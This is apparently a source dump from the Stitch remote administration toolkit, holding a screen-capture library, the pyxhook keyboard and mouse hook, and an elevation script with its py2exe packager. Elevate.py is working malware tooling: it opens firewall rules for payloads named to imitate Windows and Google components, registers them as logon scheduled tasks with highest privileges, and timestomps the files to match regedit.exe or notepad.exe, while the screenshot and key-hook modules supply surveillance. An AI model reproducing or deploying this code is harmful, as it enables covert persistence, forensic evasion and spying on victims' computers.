        if isfile(libmss):
            self.mss = cdll.LoadLibrary(libmss)
            self.use_mss = True
        else:
            print('No MSS library found. Using slow native function.')

        self._set_argtypes()
        self._set_restypes()

        self.display = self.xlib.XOpenDisplay(display)
        try:
            assert self.display.contents
        except ValueError:
            raise ScreenshotError('Cannot open display "{0}".'.format(display))
        screen = self.xlib.XDefaultScreen(self.display)
        self.root = self.xlib.XDefaultRootWindow(self.display, screen)

    def _set_argtypes(self):
        ''' Functions arguments.

            Curiously, if we set up XGetPixel arguments type,
            the entire process takes twice more time.
            So, no need to waste this precious time :)
            Note: this issue does not occur when using libmss.
        '''

        self.xlib.XOpenDisplay.argtypes = [c_char_p]
        self.xlib.XDefaultScreen.argtypes = [POINTER(Display)]
        self.xlib.XDefaultRootWindow.argtypes = [POINTER(Display), c_int]
        self.xlib.XGetWindowAttributes.argtypes = [POINTER(Display),
                                                   POINTER(XWindowAttributes),
                                                   POINTER(XWindowAttributes)]
        self.xlib.XAllPlanes.argtypes = []
        self.xlib.XGetImage.argtypes = [POINTER(Display), POINTER(Display),
                                        c_int, c_int, c_uint, c_uint, c_ulong,
                                        c_int]
        # self.xlib.XGetPixel.argtypes = [POINTER(XImage), c_int, c_int]
        self.xlib.XDestroyImage.argtypes = [POINTER(XImage)]
        self.xlib.XCloseDisplay.argtypes = [POINTER(Display)]
        self.xrandr.XRRGetScreenResources.argtypes = [POINTER(Display),
                                                      POINTER(Display)]
        self.xrandr.XRRGetCrtcInfo.argtypes = [POINTER(Display),
                                               POINTER(XRRScreenResources),
                                               c_long]
        self.xrandr.XRRFreeScreenResources.argtypes = \
            [POINTER(XRRScreenResources)]
        self.xrandr.XRRFreeCrtcInfo.argtypes = [POINTER(XRRCrtcInfo)]
        if self.use_mss:
            self.mss.GetXImagePixels.argtypes = [POINTER(XImage), c_void_p]

    def _set_restypes(self):
        ''' Functions return type. '''

        def validate(value):
            ''' Validate the returned value of xrandr.XRRGetScreenResources().
                We can end on a segfault if not:
                    Xlib:  extension "RANDR" missing on display "...".
            '''

            if value == 0:
                err = 'xrandr.XRRGetScreenResources() failed.'
                err += ' NULL pointer received.'
                raise ScreenshotError(err)

            return cast(value, POINTER(XRRScreenResources))

        self.xlib.XOpenDisplay.restype = POINTER(Display)
        self.xlib.XDefaultScreen.restype = c_int
        self.xlib.XGetWindowAttributes.restype = c_int
        self.xlib.XAllPlanes.restype = c_ulong
        self.xlib.XGetImage.restype = POINTER(XImage)
        self.xlib.XGetPixel.restype = c_ulong
        self.xlib.XDestroyImage.restype = c_void_p
        self.xlib.XCloseDisplay.restype = c_void_p
        self.xlib.XDefaultRootWindow.restype = POINTER(XWindowAttributes)
        self.xrandr.XRRGetScreenResources.restype = validate
        self.xrandr.XRRGetCrtcInfo.restype = POINTER(XRRCrtcInfo)
        self.xrandr.XRRFreeScreenResources.restype = c_void_p
        self.xrandr.XRRFreeCrtcInfo.restype = c_void_p
        if self.use_mss:
            self.mss.GetXImagePixels.restype = c_int

    def enum_display_monitors(self, force=False):
        ''' Get positions of monitors (see parent class). '''

        if not self.monitors or force:
            self.monitors = []

            # All monitors
            gwa = XWindowAttributes()
            self.xlib.XGetWindowAttributes(self.display, self.root, byref(gwa))
            self.monitors.append({
                'left': int(gwa.x),
                'top': int(gwa.y),
                'width': int(gwa.width),
                'height': int(gwa.height),
                'monitor': 0
            })

            # Each monitors
            # Fix for XRRGetScreenResources:
            #     expected LP_Display instance instead of LP_XWindowAttributes
            root = cast(self.root, POINTER(Display))
            mon = self.xrandr.XRRGetScreenResources(self.display, root)
            for num in range(mon.contents.ncrtc):
                crtc = self.xrandr.XRRGetCrtcInfo(self.display, mon,
                                                  mon.contents.crtcs[num])
                self.monitors.append({
                    'left': int(crtc.contents.x),
                    'top': int(crtc.contents.y),
                    'width': int(crtc.contents.width),
                    'height': int(crtc.contents.height),
                    'monitor': num
                })
                self.xrandr.XRRFreeCrtcInfo(crtc)
            self.xrandr.XRRFreeScreenResources(mon)

        return self.monitors

    def get_pixels(self, monitor):
        ''' Retrieve all pixels from a monitor. Pixels have to be RGB. '''

        self.width = monitor['width']
        self.height = monitor['height']
        left, top = monitor['left'], monitor['top']
        zpixmap = 2
        allplanes = self.xlib.XAllPlanes()

        # Fix for XGetImage:
        #     expected LP_Display instance instead of LP_XWindowAttributes
        root = cast(self.root, POINTER(Display))
        ximage = self.xlib.XGetImage(self.display, root, left, top,
                                     self.width, self.height, allplanes,
                                     zpixmap)
        if not ximage:
            err = 'xlib.XGetImage() failed. Monitor informations: '
            for key, val in sorted(monitor.items()):
                err = '{0}{1}: {2}, '.format(err, key, val)
            err = err.strip(', ')
            raise ScreenshotError(err)

        if not self.use_mss:
            self.get_pixels_slow(ximage)
        else:
            self.image = create_string_buffer(self.height * self.width * 3)
            ret = self.mss.GetXImagePixels(ximage, self.image)
            if not ret:
                self.xlib.XDestroyImage(ximage)
                err = 'libmss.GetXImagePixels() failed (retcode={0}).'
                raise ScreenshotError(err.format(ret))
        self.xlib.XDestroyImage(ximage)
        return self.image

    def get_pixels_slow(self, ximage):
        ''' Retrieve all pixels from a monitor. Pixels have to be RGB.
            (!) Insanely slow version, see doc/linux-slow-version. (!)
        '''

        # @TODO: this part takes most of the time. Need a better solution.
        def pix(pixel, _resultats={}, p__=pack):
            ''' Apply shifts to a pixel to get the RGB values.
                This method uses of memoization.
            '''

            # pylint: disable=dangerous-default-value

            if pixel not in _resultats:
                _resultats[pixel] = p__('<B', (pixel & rmask) >> 16) + \
                    p__('<B', (pixel & gmask) >> 8) + \
                    p__('<B', pixel & bmask)
            return _resultats[pixel]

        self.width = ximage.contents.width
        self.height = ximage.contents.height
        rmask = ximage.contents.red_mask
        bmask = ximage.contents.blue_mask
        gmask = ximage.contents.green_mask
        get_pix = self.xlib.XGetPixel
        pixels = [pix(get_pix(ximage, x, y))
                  for y in range(self.height) for x in range(self.width)]
        self.image = b''.join(pixels)
        return self.image


def arch():
    ''' Detect OS architecture.
        Returns an int: 32 or 64
    '''

    return 64 if maxsize > 2 ** 32 else 32

```

`Configuration/mss/linux/build.sh`:

```sh
#!/bin/sh
#
# Build the MSS library for the Python MSS module.
# See https://github.com/BoboTiG/python-mss
#

set -e -u

CC="gcc"
CFLAGS="-s -shared -rdynamic -fPIC -Wall -pedantic -lX11"
ARCH=$(getconf LONG_BIT)

clean() {
	echo "rm -f */libmss.so"
	rm -f */libmss.so
}

build() {
	local arch="$1"

        echo "mkdir -p $arch"
	mkdir -p $arch
	echo "$CC $CFLAGS -m$arch  mss.c -o $arch/libmss.so"
	$CC $CFLAGS -m$arch mss.c -o $arch/libmss.so
}

if [ $ARCH -eq 64 ]; then
	build 64
fi
build 32

```

`Configuration/mss/linux/mss.c`:

```c
/*
 * This is part of the MSS Python's module.
 * This will be compiled into libmss.so and then
 * you can call it from ctypes.
 *
 * See MSSLinux:get_pixels() for a real world example.
 *
 * Source: https://github.com/BoboTiG/python-mss
 */

#include <X11/Xlib.h>
#include <X11/Xutil.h>  /* For XGetPixel prototype */

int GetXImagePixels(XImage *ximage, unsigned char *pixels) {
    unsigned int x, y, offset;
    unsigned long pixel;

    if ( !ximage ) {
        return -1;
    }
    if ( !pixels ) {
        return 0;
    }

    for ( x = 0; x < ximage->width; ++x ) {
        for ( y = 0; y < ximage->height; ++y ) {
            offset =  x * 3 + ximage->width * y * 3;
            pixel = XGetPixel(ximage, x, y);
            pixels[offset]     = (pixel & ximage->red_mask) >> 16;
            pixels[offset + 1] = (pixel & ximage->green_mask) >> 8;
            pixels[offset + 2] =  pixel & ximage->blue_mask;
        }
    }
    return 1;
}

```

`Configuration/mss/windows.py`:

```py
#!/usr/bin/env python
# coding: utf-8
''' This is part of the MSS Python's module.
    Source: https://github.com/BoboTiG/python-mss
'''

from ctypes import (
    POINTER, WINFUNCTYPE, Structure, c_void_p, create_string_buffer, sizeof,
    windll)
from ctypes.wintypes import (
    BOOL, DOUBLE, DWORD, HBITMAP, HDC, HGDIOBJ, HWND, INT, LONG, LPARAM, RECT,
    UINT, WORD)

from .base import MSSBase
from .exception import ScreenshotError

__all__ = ['MSS']


class BITMAPINFOHEADER(Structure):
    ''' Information about the dimensions and color format of a DIB. '''

    _fields_ = [('biSize', DWORD), ('biWidth', LONG), ('biHeight', LONG),
                ('biPlanes', WORD), ('biBitCount', WORD),
                ('biCompression', DWORD), ('biSizeImage', DWORD),
                ('biXPelsPerMeter', LONG), ('biYPelsPerMeter', LONG),
                ('biClrUsed', DWORD), ('biClrImportant', DWORD)]


class BITMAPINFO(Structure):
    ''' Structure that defines the dimensions and color information
        for a DIB.
    '''

    _fields_ = [('bmiHeader', BITMAPINFOHEADER), ('bmiColors', DWORD * 3)]


class MSS(MSSBase):
    ''' Mutliple ScreenShots implementation for Microsoft Windows. '''

    def __init__(self):
        ''' Windows initialisations. '''

        self.monitorenumproc = WINFUNCTYPE(INT, DWORD, DWORD, POINTER(RECT),
                                           DOUBLE)
        set_argtypes(self.monitorenumproc)
        set_restypes()

    def enum_display_monitors(self, force=False):
        ''' Get positions of monitors (see parent class). '''

        if not self.monitors or force:
            self.monitors = []

            # All monitors
            sm_xvirtualscreen, sm_yvirtualscreen = 76, 77
            sm_cxvirtualscreen, sm_cyvirtualscreen = 78, 79
            left = windll.user32.GetSystemMetrics(sm_xvirtualscreen)
            right = windll.user32.GetSystemMetrics(sm_cxvirtualscreen)
            top = windll.user32.GetSystemMetrics(sm_yvirtualscreen)
            bottom = windll.user32.GetSystemMetrics(sm_cyvirtualscreen)
            self.monitors.append({
                'left': int(left),
                'top': int(top),
                'width': int(right - left),
                'height': int(bottom - top)
            })

            # Each monitors
            def _callback(monitor, data, rect, dc_):
                ''' Callback for monitorenumproc() function, it will return
                    a RECT with appropriate values.
                '''

                del monitor, data, dc_
                rct = rect.contents
                self.monitors.append({
                    'left': int(rct.left),
                    'top': int(rct.top),
                    'width': int(rct.right - rct.left),
                    'height': int(rct.bottom - rct.top)
                })
                return 1

            callback = self.monitorenumproc(_callback)
            windll.user32.EnumDisplayMonitors(0, 0, callback, 0)

        return self.monitors

    def get_pixels(self, monitor):
        ''' Retrieve all pixels from a monitor. Pixels have to be RGB.

            In the code, there are few interesting things:

            [1] bmi.bmiHeader.biHeight = -height

            A bottom-up DIB is specified by setting the height to a
            positive number, while a top-down DIB is specified by
            setting the height to a negative number.
            https://msdn.microsoft.com/en-us/library/ms787796.aspx
            https://msdn.microsoft.com/en-us/library/dd144879%28v=vs.85%29.aspx


            [2] bmi.bmiHeader.biBitCount = 32
                image_data = create_string_buffer(height * width * 4)
                # and later, the BGRX to RGB conversion

            We grab the image in RGBX mode, so that each word is 32bit
            and we have no striding, then we transform to RGB.
            Inspired by https://github.com/zoofIO/flexx


            [3] bmi.bmiHeader.biClrUsed = 0
                bmi.bmiHeader.biClrImportant = 0

            When biClrUsed and biClrImportant are set to zero, there
            is "no" color table, so we can read the pixels of the bitmap
            retrieved by gdi32.GetDIBits() as a sequence of RGB values.
            Thanks to http://stackoverflow.com/a/3688682
        '''

        self.width = monitor['width']
        self.height = monitor['height']
        left, top = monitor['left'], monitor['top']
        srcdc = None
        memdc = None
        bmp = None

        try:
            bmi = BITMAPINFO()
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
            bmi.bmiHeader.biWidth = self.width
            bmi.bmiHeader.biHeight = -self.height  # Why minux? See [1]
            bmi.bmiHeader.biPlanes = 1  # Always 1
            bmi.bmiHeader.biBitCount = 32  # See [2]
            bmi.bmiHeader.biCompression = 0  # 0 = BI_RGB (no compression)
            bmi.bmiHeader.biClrUsed = 0  # See [3]
            bmi.bmiHeader.biClrImportant = 0  # See [3]

            buf_len = self.height * self.width * 4  # See [2]
            image_data = create_string_buffer(buf_len)
            srcdc = windll.user32.GetWindowDC(0)
            memdc = windll.gdi32.CreateCompatibleDC(srcdc)
            bmp = windll.gdi32.CreateCompatibleBitmap(srcdc, self.width,
                                                      self.height)
            windll.gdi32.SelectObject(memdc, bmp)
            windll.gdi32.BitBlt(memdc, 0, 0, self.width, self.height, srcdc,
                                left, top, 0xCC0020)  # 0xCC0020 = SRCCOPY
            bits = windll.gdi32.GetDIBits(memdc, bmp, 0, self.height,
                                          image_data, bmi, 0)
            if bits != self.height:
                raise ScreenshotError('gdi32.GetDIBits() failed.')
        finally:
            # Clean up
            if srcdc:
                windll.gdi32.DeleteObject(srcdc)
            if memdc:
                windll.gdi32.DeleteObject(memdc)
            if bmp:
                windll.gdi32.DeleteObject(bmp)

        # Replace pixels values: BGRX to RGB. See [2].
        image = bytearray(self.height * self.width * 3)
        image[0::3], image[1::3], image[2::3] = \
            image_data[2::4], image_data[1::4], image_data[0::4]
        self.image = bytes(image)
        return self.image


def set_argtypes(callback):
    ''' Functions arguments. '''

    windll.user32.GetSystemMetrics.argtypes = [INT]
    windll.user32.EnumDisplayMonitors.argtypes = \
        [HDC, c_void_p, callback, LPARAM]
    windll.user32.GetWindowDC.argtypes = [HWND]
    windll.gdi32.CreateCompatibleDC.argtypes = [HDC]
    windll.gdi32.CreateCompatibleBitmap.argtypes = [HDC, INT, INT]
    windll.gdi32.SelectObject.argtypes = [HDC, HGDIOBJ]
    windll.gdi32.BitBlt.argtypes = \
        [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD]
    windll.gdi32.DeleteObject.argtypes = [HGDIOBJ]
    windll.gdi32.GetDIBits.argtypes = \
        [HDC, HBITMAP, UINT, UINT, c_void_p, POINTER(BITMAPINFO), UINT]


def set_restypes():
    ''' Functions return type. '''

    windll.user32.GetSystemMetrics.restype = INT
    windll.user32.EnumDisplayMonitors.restype = BOOL
    windll.user32.GetWindowDC.restype = HDC
    windll.gdi32.CreateCompatibleDC.restype = HDC
    windll.gdi32.CreateCompatibleBitmap.restype = HBITMAP
    windll.gdi32.SelectObject.restype = HGDIOBJ
    windll.gdi32.BitBlt.restype = BOOL
    windll.gdi32.GetDIBits.restype = INT
    windll.gdi32.DeleteObject.restype = BOOL

```

`Configuration/pyxhook.py`:

```py
#!/usr/bin/python
#
# pyxhook -- an extension to emulate some of the PyHook library on linux.
#
#    Copyright (C) 2008 Tim Alexander <dragonfyre13@gmail.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program; if not, write to the Free Software
#    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
#
#    Thanks to Alex Badea <vamposdecampos@gmail.com> for writing the Record
#    demo for the xlib libraries. It helped me immensely working with these
#    in this library.
#
#    Thanks to the python-xlib team. This wouldn't have been possible without
#    your code.
#
#    This requires:
#    at least python-xlib 1.4
#    xwindows must have the "record" extension present, and active.
#
#    This file has now been somewhat extensively modified by
#    Daniel Folkinshteyn <nanotube@users.sf.net>
#    So if there are any bugs, they are probably my fault. :)

import sys
import os
import re
import time
import threading

from Xlib import X, XK, display, error
from Xlib.ext import record
from Xlib.protocol import rq

#######################################################################
########################START CLASS DEF################################
#######################################################################

class HookManager(threading.Thread):
    """This is the main class. Instantiate it, and you can hand it KeyDown and KeyUp (functions in your own code) which execute to parse the pyxhookkeyevent class that is returned.

    This simply takes these two values for now:
    KeyDown = The function to execute when a key is pressed, if it returns anything. It hands the function an argument that is the pyxhookkeyevent class.
    KeyUp = The function to execute when a key is released, if it returns anything. It hands the function an argument that is the pyxhookkeyevent class.
    """

    def __init__(self):
        threading.Thread.__init__(self)
        self.finished = threading.Event()

        # Give these some initial values
        self.mouse_position_x = 0
        self.mouse_position_y = 0
        self.ison = {"shift":False, "caps":False}

        # Compile our regex statements.
        self.isshift = re.compile('^Shift')
        self.iscaps = re.compile('^Caps_Lock')
        self.shiftablechar = re.compile('^[a-z0-9]$|^minus$|^equal$|^bracketleft$|^bracketright$|^semicolon$|^backslash$|^apostrophe$|^comma$|^period$|^slash$|^grave$')
        self.logrelease = re.compile('.*')
        self.isspace = re.compile('^space$')

        # Assign default function actions (do nothing).
        self.KeyDown = lambda x: True
        self.KeyUp = lambda x: True
        self.MouseAllButtonsDown = lambda x: True
        self.MouseAllButtonsUp = lambda x: True

        self.contextEventMask = [X.KeyPress,X.MotionNotify]

        # Hook to our display.
        self.local_dpy = display.Display()
        self.record_dpy = display.Display()

    def run(self):
        # Check if the extension is present
        if not self.record_dpy.has_extension("RECORD"):
            print "RECORD extension not found"
            sys.exit(1)
        r = self.record_dpy.record_get_version(0, 0)
        print "RECORD extension version %d.%d" % (r.major_version, r.minor_version)

        # Create a recording context; we only want key and mouse events
        self.ctx = self.record_dpy.record_create_context(
                0,
                [record.AllClients],
                [{
                        'core_requests': (0, 0),
                        'core_replies': (0, 0),
                        'ext_requests': (0, 0, 0, 0),
                        'ext_replies': (0, 0, 0, 0),
                        'delivered_events': (0, 0),
                        'device_events': tuple(self.contextEventMask), #(X.KeyPress, X.ButtonPress),
                        'errors': (0, 0),
                        'client_started': False,
                        'client_died': False,
                }])

        # Enable the context; this only returns after a call to record_disable_context,
        # while calling the callback function in the meantime
        self.record_dpy.record_enable_context(self.ctx, self.processevents)
        # Finally free the context
        self.record_dpy.record_free_context(self.ctx)

    def cancel(self):
        self.finished.set()
        self.local_dpy.record_disable_context(self.ctx)
        self.local_dpy.flush()

    def printevent(self, event):
        print event

    def HookKeyboard(self):
        pass
        # We don't need to do anything here anymore, since the default mask
        # is now set to contain X.KeyPress
        #self.contextEventMask[0] = X.KeyPress

    def HookMouse(self):
        pass
        # We don't need to do anything here anymore, since the default mask
        # is now set to contain X.MotionNotify

        # need mouse motion to track pointer position, since ButtonPress events
        # don't carry that info.
        #self.contextEventMask[1] = X.MotionNotify

    def processevents(self, reply):
        if reply.category != record.FromServer:
            return
        if reply.client_swapped:
            print "* received swapped protocol data, cowardly ignored"
            return
        if not len(reply.data) or ord(reply.data[0]) < 2:
            # not an event
            return
        data = reply.data
        while len(data):
            event, data = rq.EventField(None).parse_binary_value(data, self.record_dpy.display, None, None)
            if event.type == X.KeyPress:
                hookevent = self.keypressevent(event)
                self.KeyDown(hookevent)
            elif event.type == X.KeyRelease:
                hookevent = self.keyreleaseevent(event)
                self.KeyUp(hookevent)
            elif event.type == X.ButtonPress:
                hookevent = self.buttonpressevent(event)
                self.MouseAllButtonsDown(hookevent)
            elif event.type == X.ButtonRelease:
                hookevent = self.buttonreleaseevent(event)
                self.MouseAllButtonsUp(hookevent)
            elif event.type == X.MotionNotify:
                # use mouse moves to record mouse position, since press and release events
                # do not give mouse position info (event.root_x and event.root_y have
                # bogus info).
                self.mousemoveevent(event)

        #print "processing events...", event.type

    def keypressevent(self, event):
        matchto = self.lookup_keysym(self.local_dpy.keycode_to_keysym(event.detail, 0))
        if self.shiftablechar.match(self.lookup_keysym(self.local_dpy.keycode_to_keysym(event.detail, 0))): ## This is a character that can be typed.
            if self.ison["shift"] == False:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
                return self.makekeyhookevent(keysym, event)
            else:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
                return self.makekeyhookevent(keysym, event)
        else: ## Not a typable character.
            keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
            if self.isshift.match(matchto):
                self.ison["shift"] = self.ison["shift"] + 1
            elif self.iscaps.match(matchto):
                if self.ison["caps"] == False:
                    self.ison["shift"] = self.ison["shift"] + 1
                    self.ison["caps"] = True
                if self.ison["caps"] == True:
                    self.ison["shift"] = self.ison["shift"] - 1
                    self.ison["caps"] = False
            return self.makekeyhookevent(keysym, event)

    def keyreleaseevent(self, event):
        if self.shiftablechar.match(self.lookup_keysym(self.local_dpy.keycode_to_keysym(event.detail, 0))):
            if self.ison["shift"] == False:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
            else:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
        else:
            keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
        matchto = self.lookup_keysym(keysym)
        if self.isshift.match(matchto):
            self.ison["shift"] = self.ison["shift"] - 1
        return self.makekeyhookevent(keysym, event)

    def buttonpressevent(self, event):
        #self.clickx = self.rootx
        #self.clicky = self.rooty
        return self.makemousehookevent(event)

    def buttonreleaseevent(self, event):
        #if (self.clickx == self.rootx) and (self.clicky == self.rooty):
            ##print "ButtonClick " + str(event.detail) + " x=" + str(self.rootx) + " y=" + str(self.rooty)
            #if (event.detail == 1) or (event.detail == 2) or (event.detail == 3):
                #self.captureclick()
        #else:
            #pass

        return self.makemousehookevent(event)

        #    sys.stdout.write("ButtonDown " + str(event.detail) + " x=" + str(self.clickx) + " y=" + str(self.clicky) + "\n")
        #    sys.stdout.write("ButtonUp " + str(event.detail) + " x=" + str(self.rootx) + " y=" + str(self.rooty) + "\n")
        #sys.stdout.flush()

    def mousemoveevent(self, event):
        self.mouse_position_x = event.root_x
        self.mouse_position_y = event.root_y

    # need the following because XK.keysym_to_string() only does printable chars
    # rather than being the correct inverse of XK.string_to_keysym()
    def lookup_keysym(self, keysym):
        for name in dir(XK):
            if name.startswith("XK_") and getattr(XK, name) == keysym:
                return name.lstrip("XK_")
        return "[%d]" % keysym

    def asciivalue(self, keysym):
        asciinum = XK.string_to_keysym(self.lookup_keysym(keysym))
        if asciinum < 256:
            return asciinum
        else:
            return 0

    def makekeyhookevent(self, keysym, event):
        storewm = self.xwindowinfo()
        if event.type == X.KeyPress:
            MessageName = "key down"
        elif event.type == X.KeyRelease:
            MessageName = "key up"
        return pyxhookkeyevent(storewm["handle"], storewm["name"], storewm["class"], self.lookup_keysym(keysym), self.asciivalue(keysym), False, event.detail, MessageName)

    def makemousehookevent(self, event):
        storewm = self.xwindowinfo()
        if event.detail == 1:
            MessageName = "mouse left "
        elif event.detail == 3:
            MessageName = "mouse right "
        elif event.detail == 2:
            MessageName = "mouse middle "
        elif event.detail == 5:
            MessageName = "mouse wheel down "
        elif event.detail == 4:
            MessageName = "mouse wheel up "
        else:
            MessageName = "mouse " + str(event.detail) + " "

        if event.type == X.ButtonPress:
            MessageName = MessageName + "down"
        elif event.type == X.ButtonRelease:
            MessageName = MessageName + "up"
        return pyxhookmouseevent(storewm["handle"], storewm["name"], storewm["class"], (self.mouse_position_x, self.mouse_position_y), MessageName)

    def xwindowinfo(self):
        try:
            windowvar = self.local_dpy.get_input_focus().focus
            wmname = windowvar.get_wm_name()
            wmclass = windowvar.get_wm_class()
            wmhandle = str(windowvar)[20:30]
        except:
            ## This is to keep things running smoothly. It almost never happens, but still...
            return {"name":None, "class":None, "handle":None}
        if (wmname == None) and (wmclass == None):
            try:
                windowvar = windowvar.query_tree().parent
                wmname = windowvar.get_wm_name()
                wmclass = windowvar.get_wm_class()
                wmhandle = str(windowvar)[20:30]
            except:
                ## This is to keep things running smoothly. It almost never happens, but still...
                return {"name":None, "class":None, "handle":None}
        if wmclass == None:
            return {"name":wmname, "class":wmclass, "handle":wmhandle}
        else:
            return {"name":wmname, "class":wmclass[0], "handle":wmhandle}

class pyxhookkeyevent:
    """This is the class that is returned with each key event.f
    It simply creates the variables below in the class.

    Window = The handle of the window.
    WindowName = The name of the window.
    WindowProcName = The backend process for the window.
    Key = The key pressed, shifted to the correct caps value.
    Ascii = An ascii representation of the key. It returns 0 if the ascii value is not between 31 and 256.
    KeyID = This is just False for now. Under windows, it is the Virtual Key Code, but that's a windows-only thing.
    ScanCode = Please don't use this. It differs for pretty much every type of keyboard. X11 abstracts this information anyway.
    MessageName = "key down", "key up".
    """

    def __init__(self, Window, WindowName, WindowProcName, Key, Ascii, KeyID, ScanCode, MessageName):
        self.Window = Window
        self.WindowName = WindowName
        self.WindowProcName = WindowProcName
        self.Key = Key
        self.Ascii = Ascii
        self.KeyID = KeyID
        self.ScanCode = ScanCode
        self.MessageName = MessageName

    def __str__(self):
        return "Window Handle: " + str(self.Window) + "\nWindow Name: " + str(self.WindowName) + "\nWindow's Process Name: " + str(self.WindowProcName) + "\nKey Pressed: " + str(self.Key) + "\nAscii Value: " + str(self.Ascii) + "\nKeyID: " + str(self.KeyID) + "\nScanCode: " + str(self.ScanCode) + "\nMessageName: " + str(self.MessageName) + "\n"

class pyxhookmouseevent:
    """This is the class that is returned with each key event.f
    It simply creates the variables below in the class.

    Window = The handle of the window.
    WindowName = The name of the window.
    WindowProcName = The backend process for the window.
    Position = 2-tuple (x,y) coordinates of the mouse click
    MessageName = "mouse left|right|middle down", "mouse left|right|middle up".
    """

    def __init__(self, Window, WindowName, WindowProcName, Position, MessageName):
        self.Window = Window
        self.WindowName = WindowName
        self.WindowProcName = WindowProcName
        self.Position = Position
        self.MessageName = MessageName

    def __str__(self):
        return "Window Handle: " + str(self.Window) + "\nWindow Name: " + str(self.WindowName) + "\nWindow's Process Name: " + str(self.WindowProcName) + "\nPosition: " + str(self.Position) + "\nMessageName: " + str(self.MessageName) + "\n"

#######################################################################
#########################END CLASS DEF#################################
#######################################################################

if __name__ == '__main__':
    hm = HookManager()
    hm.HookKeyboard()
    hm.HookMouse()
    hm.KeyDown = hm.printevent
    hm.KeyUp = hm.printevent
    hm.MouseAllButtonsDown = hm.printevent
    hm.MouseAllButtonsUp = hm.printevent
    hm.start()
    time.sleep(10)
    hm.cancel()

```

`Elevation/elevate.py`:

```py
#!/usr/bin/python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import subprocess, sys, os, ctypes

def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}".format(errors)
    except KeyboardInterrupt:
        print "Terminated command."

nsis_exe = {'chrome':'Google Installer.exe',
        'drive' : 'Windows Drive Installer.exe',
        'IAStorIcon' : 'Windows Iastor Installer.exe',
        'SecEdit' : 'Windows SecEdit Update.exe',
        'searchfilterhost' : 'Windows SearchConfig Installer.exe',
        'WUDFPort' : 'Windows Ports Manager Installer.exe',
        'MSASTUIL' : 'Windows Defender Update.exe',
        'WmiPrvSE' : 'Windows WmiPrv Installer.exe'}

nsis_path = {'chrome':'Google',
        'drive' : 'WDRV',
        'IAStorIcon' : 'WIAS',
        'SecEdit' : 'WSEC',
        'searchfilterhost' : 'WSRCH',
        'WUDFPort' : 'WUDF',
        'MSASTUIL' : 'WSEC',
        'WmiPrvSE' : 'WMIP'}

for key in nsis_path:
    inst_dir = "C:\\Windows\\SysWOW64\\"
    pld_exe = '{}.exe'.format(key)
    pld_nsis = nsis_path[key]
    pld_path = os.path.join(inst_dir,pld_nsis)
    pld_exe_path = os.path.join(pld_path,pld_exe)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    if os.path.exists(pld_exe_path):
        run_command('netsh advfirewall firewall add rule name="{}" dir=in action=allow program="{}" enable=yes'.format(key,pld_exe_path))
        if is_admin:
            run_command('schtasks /create /sc onlogon /tn {}_st /rl highest /tr "{}"'.format(key,pld_exe_path))
        else:
            run_command('schtasks /create /sc onlogon /tn {}_st /tr "{}"'.format(key,pld_exe_path))

    if os.path.exists('C:\\Windows\\regedit.exe'):
        infofile = 'C:\\Windows\\regedit.exe'
    elif os.path.exists('C:\\Windows\\notepad.exe'):
        infofile = 'C:\\Windows\\notepad.exe'

    cmd ='powershell "echo (Get-ChildItem %s).LastWriteTime"' % (infofile)
    l_mod = run_command(cmd).strip()
    cmd ='powershell "echo (Get-ChildItem %s).LastAccessTime"' % (infofile)
    l_acc = run_command(cmd).strip()
    cmd ='powershell "echo (Get-ChildItem %s).CreationTime"' % (infofile)
    l_cre = run_command(cmd).strip()

    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.LastWriteTime = \'%s\' }"' % (pld_exe_path,l_mod)
    run_command(cmd)
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.LastAccessTime = \'%s\' }"' % (pld_exe_path,l_acc)
    run_command(cmd)
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.CreationTime = \'%s\' }"' % (pld_exe_path,l_cre)
    run_command(cmd)

    cmd ='powershell "Get-Item \'%s\' | %% { $_.LastWriteTime = \'%s\' }"' % (pld_path,l_mod)
    run_command(cmd)
    cmd ='powershell "Get-Item \'%s\' | %% { $_.LastAccessTime = \'%s\' }"' % (pld_path,l_acc)
    run_command(cmd)
    cmd ='powershell "Get-Item \'%s\' | %% { $_.CreationTime = \'%s\' }"' % (pld_path,l_cre)
    run_command(cmd)

```

`Elevation/elevatepy2exe.py`:

```py
__author__ = "Stitch626"
__version__ = "1.6"



from distutils.core import setup
import py2exe , sys, os

setup(
    options = {'py2exe': {'bundle_files': 1}},

    windows = [{'script': "elevate_ntct.py"}],
    zipfile = None,
)

```

`LICENSE`:

```
MIT License
Copyright (c) 2017, Nathan Lopez

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
